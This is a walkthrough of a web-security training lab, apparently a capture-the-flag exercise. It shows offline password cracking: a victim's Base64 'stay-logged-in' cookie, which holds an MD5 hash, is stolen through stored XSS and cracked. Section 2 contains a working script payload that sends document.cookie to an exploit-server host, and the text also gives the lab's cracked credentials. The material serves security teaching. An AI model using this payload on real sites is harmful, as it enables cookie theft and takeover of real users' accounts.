# Offline Password Cracking



## Definition



**Offline password cracking** is the process of recovering a password from a stolen password hash without repeatedly 
interacting with the target application.




In this lab, the `stay-logged-in` cookie contains a Base64-encoded value constructed as:



```text

username:MD5(password)

```



The lab also contains a **Stored XSS** vulnerability in the comment functionality, which allows us to steal the victim's 
cookie.



---



## Lab Objective



* Steal Carlos's `stay-logged-in` cookie.

* Decode the cookie.

* Extract the MD5 password hash.


* Crack the hash to recover Carlos's password.

* Log in as Carlos.

* Delete his account.



---



## 1. Analyze the Stay-Logged-In Cookie



First, log in using:



```text

wiener:peter

```



In Burp Suite:



**Proxy → HTTP history**



Inspect the response to the login request.



The response contains:



```http

Set-Cookie: stay-logged-in=...

```



The cookie is Base64 encoded.



After decoding it, the structure is:



```text

username:MD5(password)

```



For example:



```text

wiener:<MD5 hash>

```



This means that the cookie contains a password hash.



---



## 2. Exploit the Stored XSS



The comment functionality is vulnerable to **Stored XSS**.



Create an exploit on the Exploit Server and note its URL.



Then submit the following payload as a comment:



```html

<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

```



]When Carlos visits the page, the stored JavaScript executes in his browser and sends his cookies to the Exploit Server.



---



## 3. Steal Carlos's Cookie



Open:



**Exploit Server → Access log**



The access log contains a request from Carlos with his cookie value.



Copy the `stay-logged-in` cookie and decode it using:



**Burp Suite → Decoder → Decode as Base64**



The decoded value is:



```text

carlos:26323c16d5f4dabff3bb136f2460a943

```



Therefore:



```text


Username: carlos

MD5 hash: 26323c16d5f4dabff3bb136f2460a943

```



---



## 4. Crack the Password



The hash is an MD5 hash.



Searching the hash reveals the password:



```text

onceuponatime

```



Therefore:



```text

Username: carlos

Password: onceuponatime

```



---



## 5. Complete the Lab



Log in using:



```text

carlos:onceuponatime

```



Then navigate to:



**My account → Delete account**



The lab is now solved.



---



## Key Takeaways



* Never store password hashes in client-side cookies.

* Base64 is encoding, not encryption.

* MD5 is not suitable for password hashing.

* Stored XSS can be used to steal sensitive session information.

* Once a password hash is stolen, it can be attacked **offline**, without interacting with the target application.



## Vulnerabilities



* Stored XSS

* Insecure stay-logged-in mechanism

* Weak password hashing with MD5

* Offline password cracking

